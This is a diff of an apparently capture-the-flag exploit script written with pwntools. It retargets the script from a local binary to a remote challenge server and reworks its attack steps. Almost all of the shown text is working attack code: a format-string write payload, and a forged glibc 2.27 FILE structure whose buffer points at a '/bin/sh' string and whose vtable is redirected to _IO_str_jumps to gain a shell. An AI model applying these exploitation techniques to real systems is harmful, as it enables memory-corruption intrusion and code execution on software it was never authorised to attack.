@@ -1,6 +1,7 @@
 #!/usr/bin/env python
 from pwn import *
 
+#context.log_level = "DEBUG"
 e = ELF("./command")
 l = ELF("./libc.so.6", checksec=False)  # 2.27
 
@@ -25,7 +26,7 @@ def dummy(n):
     return cyclic(n)
 
 if __name__ == "__main__":
-    p = process("./command")
+    p = remote("command.pwn2.win", 1337)
 
     p.recvuntil("Your name: ")
     p.send(b"%32896c%4$hn") # 0x8080
@@ -65,11 +66,9 @@ if __name__ == "__main__":
     from FILE import *
     context.arch = "amd64"
     fake_file = IO_FILE_plus_struct()
-    fake_file._mode = -1
-    fake_file._IO_write_ptr = 1
-    fake_file._IO_write_base = 0
-    fake_file._IO_buf_base = str_bin_sh
+
     fake_file._flags = 0xfbad8080
+    fake_file._IO_buf_base = str_bin_sh
     fake_file.vtable = _io_str_jumps
 
     # restriction:
